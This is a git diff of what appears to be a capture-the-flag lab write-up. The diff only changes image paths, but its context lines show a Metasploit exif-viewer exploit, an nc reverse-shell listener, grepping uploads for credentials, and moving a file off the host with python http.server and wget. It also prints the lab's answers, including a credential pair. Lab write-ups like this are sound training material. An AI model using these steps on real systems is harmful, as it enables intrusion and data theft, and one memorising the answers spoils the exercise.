@@ -30,13 +30,13 @@ msfconsole
 search exif viewer
 ```
 
-![](Assets/Pasted%20image%2020251028145427.png)
+![](../Assets/Pasted%20image%2020251028145427.png)
 
 Here we have a bunch of exploits for this tool.
 
 Lets use the first one.
 
-![](Assets/Pasted%20image%2020251028145921.png)
+![](../Assets/Pasted%20image%2020251028145921.png)
 
 We have created a file to upload to the server.
 First lets make a nc listener on port 4444
@@ -44,7 +44,7 @@ First lets make a nc listener on port 4444
 nc -lvnp 4444
 ```
 
-![](Assets/Pasted%20image%2020251028151034.png)
+![](../Assets/Pasted%20image%2020251028151034.png)
 
 Great here we have a reverse shell
 ```
@@ -60,7 +60,7 @@ Lets look for any files that may contain this information.
 grep -r "waltersltd" /var/www/93c0550a5543b366_uploads
 ```
 
-![](Assets/Pasted%20image%2020251028151345.png)
+![](../Assets/Pasted%20image%2020251028151345.png)
 
 Answer: salvarado@waltersltd.hv:hGCQjxZs5chK
 
@@ -72,7 +72,7 @@ python3 -m http.server 8000
 wget http://172.20.49.87:8000/Ja23s6_techinnovations_invoice.pdf
 ```
 
-![](Assets/Pasted%20image%2020251028151720.png)
+![](../Assets/Pasted%20image%2020251028151720.png)
 
 Answer: INV-20240228-1234
 
